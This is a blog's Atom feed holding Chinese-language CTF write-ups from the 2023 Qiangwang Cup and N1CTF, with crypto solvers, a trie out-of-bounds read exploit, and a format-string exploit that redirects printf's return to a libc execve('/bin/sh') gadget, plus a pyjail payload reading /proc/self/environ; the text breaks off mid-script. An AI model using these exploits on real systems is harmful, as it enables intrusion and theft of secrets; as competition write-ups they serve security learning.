<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lmarch2&#39;blog</title>
  
  <subtitle>求知若渴，虚心若愚</subtitle>
  <link href="http://lmarch2.github.io/atom.xml" rel="self"/>
  
  <link href="http://lmarch2.github.io/"/>
  <updated>2024-02-04T06:55:24.346Z</updated>
  <id>http://lmarch2.github.io/</id>
  
  <author>
    <name>lmarch2</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HASHTEAM2023强网杯wp</title>
    <link href="http://lmarch2.github.io/posts/19b7e153/"/>
    <id>http://lmarch2.github.io/posts/19b7e153/</id>
    <published>2024-01-29T16:47:18.000Z</published>
    <updated>2024-02-04T06:55:24.346Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="2023强网杯"><a href="#2023强网杯" class="headerlink" title="2023强网杯"></a>2023强网杯</h1><p>强网杯疯狂坐牢，pwn做不了一点只能在强网先锋划划水….只能说，来年再战！</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Not-only-rsa"><a href="#Not-only-rsa" class="headerlink" title="Not only rsa"></a>Not only rsa</h4><p>开就完了,直接上代码</p><pre class=" language-Python"><code class="language-Python">from Crypto.Util.number import *from tqdm import tqdmn = 6249734963373034215610144758924910630356277447014258270888329547267471837899275103421406467763122499270790512099702898939814547982931674247240623063334781529511973585977522269522704997379194673181703247780179146749499072297334876619475914747479522310651303344623434565831770309615574478274456549054332451773452773119453059618433160299319070430295124113199473337940505806777950838270849e = 641747c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943p=91027438112295439314606669837102361953591324472804851543344131406676387779969F=Zmod(n)root=F(c).nth_root(e,all=True)#print(root[0])for i in tqdm(root):    m=long_to_bytes(int(i))    if b'flag' in m:        print(m)       </code></pre><blockquote><p>flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a}</p></blockquote><h4 id="Babyrsa"><a href="#Babyrsa" class="headerlink" title="Babyrsa"></a>Babyrsa</h4><p>论文题,搜了半天<a href="https://www.sciencedirect.com/science/article/pii/S0304397523002116">https://www.sciencedirect.com/science/article/pii/S0304397523002116</a></p><p>接下来是复现代码,但最后没能求出解</p><pre class=" language-Python"><code class="language-Python">from math import floorN=6898173619848064713447564687612858995735894135343384489074201607621085283538310939996931861826971767108397996532717248188385645126212591434896047930808649179911798954640222107637439329674735608839417381358005576992626135001753481619659559186340117078191830600433093397242376731829372681835293083621809e=18607371079843502780378872043757955319820913116247483798885064959406363250603378245586504841113742273225193107044375347430381173075888621199154655015790594262611354939631226770280837471203456810631351598504038204190312822325230950609345436371947238885587725399278901711345945547722129359115083215511568569473191308964154024336081584451627244805369215138746534093267741448684155642482008850649100654786552416480077517243070018360909360575406706389289250072987726362674233556989150088794863182955760986933773623415912617726008667185604638388708370787554333594517677850758769655741063461283985588988450577# N=611402847577596838649117628567007514815745193613363898749361# e=256620536587836325389289742308993660982466972819568896656661249105081887104266414292000389611061562475252796784804753727def small_roots(f, bounds, m, d=None):    monomials=[]    pols=[]        if not d:        d = f.degree()    R = f.base_ring()    N = R.cardinality()    f /= f.coefficients().pop(0)    f = f.change_ring(ZZ)    G = Sequence([], f.parent())    for s in range(m + 1):        for i in range(s,m+1):            for j in range(2*s,2*s+2):                base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s)                G.append(base)                    for s in range(m + 1):        for i in range(s,s+1):            for j in range(2*s+2,2*s+t+1):                base = x ^ (i - s)* y ^(j-2*s) * f ^ s * e ^ (m - s)                G.append(base)                    for poly in G:                  for v in poly.monomials():            if v not in monomials:                monomials.append(v)        print(len(G))    B, monomials = G.coefficient_matrix()    monomials = vector(monomials)    factors = [monomial(*bounds) for monomial in monomials]    for i, factor in enumerate(factors):        B.rescale_col(i, factor)    print(B.nrows(),B.ncols())        B = B.dense_matrix().LLL()    B = B.change_ring(QQ)    for i, factor in enumerate(factors):        B.rescale_col(i, 1 / factor)        H = Sequence([], f.parent().change_ring(QQ))    for h in filter(None, B * monomials):        H.append(h)        I = H.ideal()        if I.dimension() == -1:            H.pop()        elif I.dimension() == 0:            roots = []            for root in I.variety(ring=ZZ):                root = tuple(R(root[var]) for var in f.variables())                roots.append(root)            return roots    return []alpha=1.997beta=0.1delta=0.678r=100m=4t=4FF=Zmod(2^r)u=FF(N).nth_root(2,all=True)print("u=",u)#u0=63161u0=603393209736955919317955738297v0=2*u0+(N-u0^2)*inverse_mod(u0,2^(2*r))%2^(2*r)print("v0=",v0)#v0=200472128882#v0=1567679278734573458233752031864430279097731087941138563289698a1=v0*inverse_mod(2^(2*r-1),e)%eprint(a1)a2=(v0^2-(N+1)^2)*inverse_mod(2^(4*r),e)%eprint(a2)a3=(-1)*inverse_mod(2^(4*r),e)%eprint(a3)X=floor(2*N^(alpha+delta-2))Y=floor(3*N^(0.5-2*beta))print('X',X)print("Y",Y)F.<x,y>=PolynomialRing(ZZ)f=x*y^2+a1*x*y+a2*x+a3res=small_roots(f,(X,Y),m)print(res)</code></pre><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Happy-Chess-SOLVED-1r0ny"><a href="#Happy-Chess-SOLVED-1r0ny" class="headerlink" title="Happy Chess|SOLVED|1r0ny"></a>Happy Chess|SOLVED|1r0ny</h4><p>非常凑巧，前几周看到了b站上的一个翻转棋的<a href="https://www.bilibili.com/video/BV1XQ4y1t79G/?buvid=YC4914C3DAF3DF87400E8938B2916ED117A7&amp;is_story_h5=false&amp;mid=gJJFvn3SB3v73NMQW9uRBw==&amp;p=1&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=ipad&amp;share_plat=ios&amp;share_source=QQ&amp;share_tag=s_i&amp;timestamp=1702796105&amp;unique_k=Z9gQh2y&amp;up_id=508466707&amp;vd_source=21b186df21e95121735877d3d4fd9e4d">视频</a></p><p>那么思路如下：</p><p>首先对于初始棋盘来说，只要把白棋或者黑棋的位置都点一遍就可以变成相同颜色</p><p>但是规定要240步之内赢10局，所以每局就有步数限制，要在大约24步之内赢一局</p><p>所以要进行步骤的优化，优化思路如下：</p><p>对于9*9的棋盘如果把一整行或者一整列全部翻转，就会把整个棋盘直接翻转</p><p>所以对于每一个可行解，可以通过观察来进行步骤的优化</p><p>把每一次的步骤优化到24步以内之后通关即可：</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049830.png" alt="img"></p><p>本题运用b站视频里的优化原理，手动玩了10次，每次步数均在24步以内，成功拿到flag</p><blockquote><p>flag{1449c7f2379d58899db438adc243867d}</p></blockquote><p>由于时间充裕，所以我是用手优化的，但是其实可以使用脚本爆破，一共有9+9=18条可以翻转的行和列，所以所有可行解的情况就有$$2^{18}$$种情况，只要使用代码全部爆破出来然后看哪个点最少就行。</p><h4 id="Pyjail-It’s-myFILTER"><a href="#Pyjail-It’s-myFILTER" class="headerlink" title="Pyjail ! It’s myFILTER !!!"></a>Pyjail ! It’s myFILTER !!!</h4><p>读环境变量获取flag</p><pre class=" language-Python"><code class="language-Python">{print(open("/proc/self/environ").read())}</code></pre><h3 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h3><h4 id="石头剪刀布？"><a href="#石头剪刀布？" class="headerlink" title="石头剪刀布？"></a>石头剪刀布？</h4><p>该模型对于相同输入的输出具有确定性，于是可以先指定前五个，再逐轮爆破</p><pre class=" language-Plain"><code class="language-Plain">####### 180from random import choiceimport randomfrom pwn import *def main():    # 设置目标地址和端口    ip = '8.147.133.95'#'8.147.135.248'    port = 19260#39167    context(log_level = 'debug',os = 'linux')    # 创建一个连接到目标的socket    #choice = [0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1,2]    choice=[0, 0, 0, 0, 0, 1, 1, 2, 2, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 1, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 1, 2, 0, 0, 2, 2, 1, 1, 0, 1, 2, 0, 1, 0, 1, 0, 2, 1, 2, 2, 0, 2, 1, 0, 0, 2, 2, 1, 1, 0, 1, 0, 1, 2, 0, 2, 0, 2, 1, 0, 2, 1, 0, 0, 1, 1, 1, 2, 2, 1, 0, 1, 2, 2, 0, 1, 2, 0, 2, 0, 1, 1, 0]    sock = remote(ip, port)    response = sock.recvuntil('++++++++++++++++++++++++++++++++++++++++++++++++++'.encode())    with open('replay.txt', 'w') as f:        choice.append(random.randint(0,2))        print(choice)        for i in range(len(choice)):            sock.sendlineafter('请出拳（0 - 石头，1 - 剪刀，2 - 布）：'.encode(),str(choice[i]).encode())            response = sock.recv(0x110).decode()            f.write(response + '\n')            if(i < 5):                continue            if 'Me10n赢了' in response:                print(i,choice[i])                print(choice)                print((choice[i]+1)%3)                break            elif '平局' in response:                print(i,choice[i])                print(choice)                print((choice[i]+2)%3)                break        f.interactive()    # 关闭连接        sock.close()if __name__ == '__main__':    main()</code></pre><h4 id="Speedup"><a href="#Speedup" class="headerlink" title="Speedup"></a>Speedup</h4><p>先看看前20个</p><pre class=" language-Python"><code class="language-Python">from math import floorfrom tqdm import tqdmn=0l=[]for i in range(1,21):    n=0    result = factorial(2^i)    res=str(result)    for j in res:        n+=int(j)    print(n)    l.append(n)print(l)</code></pre><p>输到这里<a href="https://oeis.org/%E6%95%B0%E6%95%B0%E7%AC%AC27%E4%B8%AA,%E5%81%9A%E4%B8%AAmd5%E5%BE%97%E5%88%B0%E7%BB%93%E6%9E%9C">https://oeis.org/数数第27个,做个md5得到结果</a></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049503.png" alt="img"></p><p>或者利用勒让德定理,分解(2^27)!</p><pre class=" language-Python"><code class="language-Python">n=2^27faclist=[]for p in tqdm(range(2,n)):    if is_prime(p):        k=1        res=0        while True:            m=pow(p,k)            if n>=m:                res+=floor(n/m)            else:                break            k+=1        faclist.append((p,res))    else:        continue        # faclist=str(faclist)# with open('test.txt', 'w') as f:     #     f.write(faclist)res=1for i in tqdm(faclist):    res*=pow(i[0],i[1])    n=0for i in str(res):    n+=int(i)print(n)</code></pre><p>然后再计算</p><h4 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h4><p>开始先发现9个字符+\n能够吧前两位置为11，尝试遍历所有字符可能</p><p>调整输入的字符串，从最后一位开始诸位爆破（代码中逐个改repeat）</p><pre class=" language-Python"><code class="language-Python">from Excalibur import *import itertoolsimport stringdef generate_strings():    # 定义要包含的字符集合    characters = string.ascii_letters + string.digits + string.punctuation    # 生成所有长度为9的可能字符串    all_combinations = itertools.product(characters, repeat=3)    # 逐个生成字符串并返回    for combination in all_combinations:        yield ''.join(combination)# 使用生成器函数逐个获取字符串string_generator = generate_strings()# 打印前几个字符串#contextset()remo('101.200.122.251',12199,1)#remo('101.200.122.251',12188,1)for _ in range(1000):    str = (next(string_generator)+'wbGood')    sl(str)    ru(b'code')    m = ru(b'\n')    if not b'110000000' in m:        print(str,m)#sl(b'1'*9)#sl(b'\xff\xff\xff\xff\xff\xff\xff\xff\xff')#sl(b'\xff\xff\xff\xff\xff\xff\xff\xff\xff')ia()</code></pre><blockquote><p>qwb{YouKnowHowToFuzz!}</p></blockquote><h4 id="Trie"><a href="#Trie" class="headerlink" title="Trie"></a>Trie</h4><p>手动硬搓，也可以写脚本更快</p><p>首先理清程序逻辑，在trie树中储存ip，查找时通过控制v3的值，越界读取end数组，从secret里读出flag</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300049397.png" alt="img"></p><p>调试发现，对于树中每插入节点的时候，tot+1，于是首先让tot为0x40，再控制ip（在二进制下每次减少一个1）使得tot每次+4，即可4字节4字节地读出flag。（需要注意的是会对tot进行一个*4的操作）</p><pre class=" language-Python"><code class="language-Python">from Excalibur import *#proc('./trie')remo('47.104.150.173',1337,1)contextset()'''for i in range(100):    ip1 = '192.168.1.'+(str(i))    sla(b'Quit.',b'1')    sla(b'IP:',ip1)    ip2 = '192.168.1.'+str(i+1)    sla(b'hop:',ip2)sla(b'Quit.',b'2')'''def setip(ip1,ip2):    sla(b'Quit.',b'1')    sla(b'IP:',ip1)    sla(b'hop:',ip2)def show(ip):    sla(b'Quit.',b'3')    sla(b'Quit.',b'2')    sla(b'IP:',ip)    ru(b'is')    flag = ru(b'\n')    print(flag)    pause()debug('b *$rebase(0x4060)\nb *$rebase(0x1619)\n')setip(b'0.0.0.0',b'0.0.0.0')#+0x20setip(b'255.255.255.255',b'0.0.0.0')#+0x20#setip(b'127.255.255.255',b'0.0.0.0')#+0x4#setip(b'63.255.255.255',b'0.0.0.0')#+0x4#setip(b'31.255.255.255',b'0.0.0.0')#+0x4#setip(b'15.255.255.255',b'0.0.0.0')#+0x4#setip(b'7.255.255.255',b'0.0.0.0')#+0x4#setip(b'3.255.255.255',b'0.0.0.0')#+0x4#setip(b'1.255.255.255',b'0.0.0.0')#+0x4#setip(b'0.255.255.255',b'0.0.0.0')#+0x4#setip(b'0.127.255.255',b'0.0.0.0')#+0x4#setip(b'0.63.255.255',b'0.0.0.0')#+0x4setip(b'0.31.255.255',b'0.0.0.0')#+0x4#setip(b'0.255.255.255',b'0.0.0.0')#+0x4#show(b'127.255.255.255')#show(b'63.255.255.255')#show(b'31.255.255.255')#show(b'15.255.255.255')#show(b'7.255.255.255')#show(b'3.255.255.255')#show(b'1.255.255.255')#show(b'0.255.255.255')#show(b'0.127.255.255')#show(b'0.63.255.255')show(b'0.31.255.255')ia()numbers = "0.0.0.125.115.121.117.103.95.117.48.121.95.115.64.95.103.110.48.114.116.115.95.53.97.95.51.109.48.99.51.66.95.48.116.95.119.48.72.123.103.97.108.102"reversed_numbers = numbers.split(".")[::-1]ascii_chars = [chr(int(num)) for num in reversed_numbers]result = "".join(ascii_chars)print(result)</code></pre><blockquote><p>flag{H0w_t0_B3c0m3_a5_str0ng_@s_y0u_guys}</p></blockquote><h4 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h4><p>修改printf的返回地址劫持程序流，同时泄漏libc地址，第二次printf改返回地址为one_shot,这里不能以下写ln不然会特别慢。</p><pre class=" language-Python"><code class="language-Python">from evilblade import *context(os='linux', arch='amd64')context(os='linux', arch='amd64', log_level='debug')setup('./pwn')libset('./libc-2.31.so')#libset('./libc.so.6')evgdb()rsetup('47.104.24.40', 1337)stack = getx(-15,-1)stack1 = stack - 8dx(stack1)#修改printf的返回地址sd(b'%4198556c'+b'%19$paaa'+b'aaa%9$n'+p64(stack1))libc = getx(-65,-51)base = getbase(libc,'__libc_start_main',243)os = base + 0xe3b01os1 = os %0x10000os2 = os %0x1000000os2 = os2 >> 16dx(stack)dx(os)pay1 = f'%{os2-4}c'.encode().ljust(8,b'a')pay2 = f'%{os1-os2-3}c'.encode().ljust(8,b'a')print(pay1)pay = pay1 + b'a%11$hhn'+ pay2 +b'aa%10$hn' +p64(stack-232)+p64(stack-230)print(len(pay))pause()sl(pay)ia()'''0xe3afe execve("/bin/sh", r15, r12)constraints:  [r15] == NULL || r15 == NULL  [r12] == NULL || r12 == NULL0xe3b01 execve("/bin/sh", r15, rdx)constraints:  [r15] == NULL || r15 == NULL  [rdx] == NULL || rdx == NULL0xe3b04 execve("/bin/sh", rsi, rdx)constraints:  [rsi] == NULL || rsi == NULL  [rdx] == NULL || rdx == NULL'''</code></pre><blockquote><p>flag{such_@n_ea5y_fmt_9ame_f0r_y0u}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="杯子" scheme="http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"/>
    
  </entry>
  
  <entry>
    <title>HASHTEAM2023N1ctfWP</title>
    <link href="http://lmarch2.github.io/posts/d8c86fdf/"/>
    <id>http://lmarch2.github.io/posts/d8c86fdf/</id>
    <published>2024-01-29T15:47:41.000Z</published>
    <updated>2024-02-04T06:55:11.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="N1CTF2023"><a href="#N1CTF2023" class="headerlink" title="N1CTF2023"></a>N1CTF2023</h1><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401310938739.PNG"></p><p>排名25，卡线</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>nonce有问题</p><p>数学模型：</p><p>e=2^128*e1+e2</p><p>d=2^128*d1+d2</p><p>nonce=2^128*e1+d1</p><p>s=(e+rd)/nonce mod n</p><p>展开 </p><p>s<em>2^128</em>e1+s<em>d1=2^128</em>e1+e2+r*(2^128*d1+d2) mod n</p><p>(s-1)<em>2^128</em>e1+(s-r*2^128)<em>d1-r</em>d2-e2==0 mod n</p><p>造格子</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004312.png" alt="img"></p><p>注意到d最高2^255一定为1，卡下界</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004049.png" alt="img"></p><h3 id="SM4"><a href="#SM4" class="headerlink" title="SM4"></a>SM4</h3><p>差分故障打四轮，直接上脚本</p><pre class=" language-TypeScript"><code class="language-TypeScript">from copy import copyDB = [[46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [246, 56, 103, 21, 181, 105, 216, 118, 145, 183, 169, 211, 27, 242, 190, 162, 237, 179, 244, 199, 206, 35, 120, 38, 95, 133, 25, 231, 3, 70, 40, 238, 223, 45, 127, 245, 4, 15, 250, 11, 52, 215, 142, 129, 167, 191, 61, 241, 188, 226, 249, 146, 221, 184, 104, 109, 157, 39, 176, 114, 236, 240, 254, 253, 251, 158, 198, 37, 42, 19, 87, 230, 153, 43, 77, 76, 208, 26, 32, 18, 150, 195, 122, 90, 80, 148, 197, 44, 83, 51, 166, 75, 88, 73, 64, 252, 20, 119, 46, 201, 196, 121, 222, 115, 22, 128, 164, 102, 97, 5, 217, 172, 177, 81, 58, 234, 168, 60, 29, 124, 147, 101, 224, 151, 130, 65, 98, 225, 155, 91, 108, 152, 140, 219, 9, 24, 189, 203, 138, 160, 59, 48, 193, 14, 69, 159, 233, 53, 135, 143, 33, 165, 41, 132, 57, 187, 227, 93, 200, 1, 0, 149, 137, 194, 23, 117, 170, 247, 17, 255, 92, 205, 47, 213, 136, 66, 2, 209, 6, 110, 78, 63, 28, 74, 235, 229, 30, 139, 154, 94, 131, 49, 86, 185, 163, 79, 68, 8, 72, 174, 99, 111, 141, 107, 210, 34, 207, 239, 106, 144, 228, 186, 89, 204, 55, 54, 171, 161, 100, 16, 13, 7, 50, 182, 112, 173, 212, 31, 214, 85, 156, 180, 175, 116, 248, 243, 36, 82, 134, 123, 220, 10, 125, 96, 67, 62, 12, 202, 126, 71, 84, 113, 232, 178, 192, 218], [46, 38, 43, 106, 114, 176, 12, 69, 1, 21, 82, 27, 184, 109, 170, 0, 179, 25, 4, 145, 33, 61, 66, 223, 85, 238, 22, 23, 59, 64, 19, 174, 180, 240, 111, 128, 187, 65, 72, 35, 77, 221, 157, 172, 13, 197, 44, 229, 226, 130, 220, 49, 198, 24, 103, 76, 39, 211, 191, 115, 165, 206, 30, 7, 98, 156, 205, 181, 89, 252, 58, 138, 253, 104, 212, 236, 54, 224, 166, 155, 118, 8, 93, 140, 28, 95, 225, 248, 80, 182, 112, 63, 192, 116, 47, 217, 91, 84, 144, 53, 124, 117, 16, 73, 218, 254, 188, 18, 11, 107, 222, 5, 52, 129, 194, 173, 81, 9, 137, 246, 242, 143, 175, 147, 74, 195, 41, 133, 207, 120, 92, 17, 164, 169, 171, 48, 241, 57, 31, 83, 55, 96, 29, 185, 68, 232, 70, 148, 243, 209, 100, 214, 37, 244, 219, 131, 203, 139, 126, 183, 167, 199, 101, 159, 50, 230, 168, 45, 149, 123, 119, 87, 134, 75, 127, 67, 250, 228, 247, 135, 113, 60, 62, 177, 150, 121, 162, 227, 142, 34, 178, 42, 15, 160, 161, 216, 235, 234, 163, 186, 154, 141, 233, 208, 78, 151, 204, 190, 86, 152, 245, 239, 108, 196, 158, 210, 99, 237, 251, 3, 40, 90, 125, 132, 36, 215, 193, 71, 255, 200, 102, 56, 32, 136, 146, 79, 97, 110, 249, 20, 202, 231, 122, 88, 94, 6, 153, 105, 14, 10, 2, 201, 189, 213, 51, 26], [206, 165, 193, 37, 187, 108, 248, 246, 44, 139, 152, 201, 173, 214, 77, 72, 97, 35, 70, 24, 3, 79, 178, 175, 30, 66, 18, 198, 114, 125, 32, 210, 180, 224, 235, 28, 62, 136, 149, 227, 82, 147, 90, 119, 85, 199, 126, 121, 51, 20, 88, 4, 75, 101, 38, 151, 109, 115, 110, 223, 43, 17, 146, 249, 226, 26, 222, 232, 87, 195, 200, 131, 245, 81, 113, 157, 220, 12, 16, 184, 204, 192, 84, 31, 197, 215, 129, 94, 93, 181, 218, 194, 65, 148, 158, 112, 221, 34, 25, 33, 243, 78, 10, 67, 209, 6, 252, 196, 237, 42, 172, 164, 161, 244, 111, 191, 46, 170, 128, 69, 183, 212, 60, 99, 8, 122, 49, 86, 247, 96, 179, 57, 135, 106, 0, 58, 100, 202, 55, 98, 1, 254, 53, 155, 156, 83, 132, 9, 19, 171, 48, 95, 166, 68, 22, 104, 7, 14, 142, 211, 213, 50, 150, 234, 182, 203, 217, 64, 185, 163, 73, 45, 41, 118, 103, 134, 186, 230, 241, 250, 52, 207, 162, 124, 140, 116, 167, 228, 92, 63, 47, 176, 239, 238, 5, 216, 225, 188, 137, 160, 80, 231, 102, 11, 89, 91, 59, 23, 240, 105, 153, 177, 138, 219, 174, 123, 36, 159, 76, 21, 56, 242, 61, 107, 133, 143, 154, 130, 233, 15, 145, 255, 13, 189, 120, 251, 236, 117, 208, 190, 169, 168, 74, 229, 54, 2, 39, 127, 29, 253, 141, 71, 205, 40, 144, 27]]WDB=DB[2:]+DB[:2]i2l = lambda x: [(x >> 24) & 0xff, (x >> 16) & 0xff, (x >> 8) & 0xff, x & 0xff]l2i = lambda x: (x[0] << 24)|(x[1] << 16)|(x[2] << 8)|x[3]rotl32 = lambda x, n: ((x << n) & 0xffffffff) | ((x >> (32-n)) & 0xffffffff)rotl8 = lambda x, n: ((x << n) & 0xff) | ((x >> (8-n)) & 0xff)xor = lambda x, y: list(map(lambda a, b: a ^ b, x, y))pad = lambda data, block=16: data + [16 - len(data) % block]*(16 - len(data) % block)SM4_BOXES_TABLE = [    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c,    0x05, 0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86,    0x06, 0x99, 0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed,    0xcf, 0xac, 0x62, 0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa,    0x75, 0x8f, 0x3f, 0xa6, 0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c,    0x19, 0xe6, 0x85, 0x4f, 0xa8, 0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb,    0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35, 0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25,    0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87, 0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52,    0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e, 0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38,    0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1, 0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34,    0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3, 0x1d, 0xf6, 0xe2, 0x2e, 0x82,    0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f, 0xd5, 0xdb, 0x37, 0x45,    0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51, 0x8d, 0x1b, 0xaf,    0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8, 0x0a, 0xc1,    0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0, 0x89,    0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39,    0x48,]SM4_FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc]SM4_CK = [    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279]Dance_Box=DBdef dance():    global Dance_Box    Dance_Box = Dance_Box[2:]+Dance_Box[:2]def round_key(k):    ar = [SM4_BOXES_TABLE[i] for i in i2l(k)]    b = l2i(ar)    return b ^ rotl32(b, 13) ^ rotl32(b, 23)def expand_key(master_key):    master_key = list(master_key)    MK = [l2i(master_key[:4]), l2i(master_key[4:8]),\           l2i(master_key[8:12]), l2i(master_key[12:])]    k = [0]*36    k[0:4] = xor(MK, SM4_FK)    for i in range(32):        k[i + 4] = k[i] ^ (round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i]))    return k[4:]def tfunc(bk):    ar = [SM4_BOXES_TABLE[i] for i in i2l(bk)]    b = l2i(ar)    return b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24)def invtfunc(b):    b=d(b)    ar=i2l(b)    bk = [SM4_BOXES_TABLE.index(i) for i in ar]    bk=l2i(bk)    return bkdef pfunc(bk):    res = []    for i in range(4):        sbox = Dance_Box[i]        ar = [sbox[_] for _ in i2l(bk[i])]        b = 